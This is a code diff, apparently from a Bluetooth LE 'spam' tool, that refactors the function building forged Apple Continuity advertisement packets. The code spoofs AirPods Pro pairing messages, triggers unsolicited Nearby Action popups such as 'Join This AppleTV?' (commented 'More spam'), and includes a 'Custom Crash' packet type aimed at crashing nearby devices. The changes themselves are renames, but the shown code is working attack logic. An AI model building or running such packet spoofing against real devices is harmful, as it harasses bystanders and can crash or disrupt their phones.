@@ -16,9 +16,9 @@ static const char* type_names[ContinuityTypeCount] = {
     [ContinuityTypeNearbyInfo] = "Nearby Info",
     [ContinuityTypeCustomCrash] = "Custom Packet",
 };
-const char* continuity_get_name(const BleSpamMsg* _msg) {
-    const ContinuityMsg* msg = &_msg->continuity;
-    return type_names[msg->type];
+const char* continuity_get_name(const BleSpamProtocolCfg* _cfg) {
+    const ContinuityCfg* cfg = &_cfg->continuity;
+    return type_names[cfg->type];
 }
 
 #define HEADER_LEN (6) // 1 Size + 1 AD Type + 2 Company ID + 1 Continuity Type + 1 Continuity Size
@@ -33,12 +33,12 @@ static uint8_t packet_sizes[ContinuityTypeCount] = {
     [ContinuityTypeCustomCrash] = HEADER_LEN + 11,
 };
 
-void continuity_make_packet(uint8_t* out_size, uint8_t** out_packet, const BleSpamMsg* _msg) {
-    const ContinuityMsg* msg = _msg ? &_msg->continuity : NULL;
+void continuity_make_packet(uint8_t* _size, uint8_t** _packet, const BleSpamProtocolCfg* _cfg) {
+    const ContinuityCfg* cfg = _cfg ? &_cfg->continuity : NULL;
 
     ContinuityType type;
-    if(msg) {
-        type = msg->type;
+    if(cfg) {
+        type = cfg->type;
     } else {
         const ContinuityType types[] = {
             ContinuityTypeProximityPair,
@@ -85,8 +85,8 @@ void continuity_make_packet(uint8_t* out_size, uint8_t** out_packet, const BleSp
 
     case ContinuityTypeProximityPair: {
         uint16_t model;
-        if(msg && msg->data.proximity_pair.model != 0x0000) {
-            model = msg->data.proximity_pair.model;
+        if(cfg && cfg->data.proximity_pair.model != 0x0000) {
+            model = cfg->data.proximity_pair.model;
         } else {
             const uint16_t models[] = {
                 0x0E20, // AirPods Pro
@@ -113,8 +113,8 @@ void continuity_make_packet(uint8_t* out_size, uint8_t** out_packet, const BleSp
         }
 
         uint8_t prefix;
-        if(msg && msg->data.proximity_pair.prefix == 0x00) {
-            prefix = msg->data.proximity_pair.prefix;
+        if(cfg && cfg->data.proximity_pair.prefix == 0x00) {
+            prefix = cfg->data.proximity_pair.prefix;
         } else {
             if(model == 0x0055 || model == 0x0030)
                 prefix = 0x05;
@@ -176,8 +176,8 @@ void continuity_make_packet(uint8_t* out_size, uint8_t** out_packet, const BleSp
 
     case ContinuityTypeNearbyAction: {
         uint8_t action;
-        if(msg && msg->data.nearby_action.type != 0x00) {
-            action = msg->data.nearby_action.type;
+        if(cfg && cfg->data.nearby_action.type != 0x00) {
+            action = cfg->data.nearby_action.type;
         } else {
             const uint8_t actions[] = {
                 0x13, // AppleTV AutoFill
@@ -197,8 +197,8 @@ void continuity_make_packet(uint8_t* out_size, uint8_t** out_packet, const BleSp
         }
 
         uint8_t flag;
-        if(msg && msg->data.nearby_action.flags != 0x00) {
-            flag = msg->data.nearby_action.flags;
+        if(cfg && cfg->data.nearby_action.flags != 0x00) {
+            flag = cfg->data.nearby_action.flags;
         } else {
             flag = 0xC0;
             if(action == 0x20 && rand() % 2) flag--; // More spam for 'Join This AppleTV?'
@@ -265,8 +265,8 @@ void continuity_make_packet(uint8_t* out_size, uint8_t** out_packet, const BleSp
         break;
     }
 
-    *out_size = size;
-    *out_packet = packet;
+    *_size = size;
+    *_packet = packet;
 }
 
 const BleSpamProtocol ble_spam_protocol_continuity = {
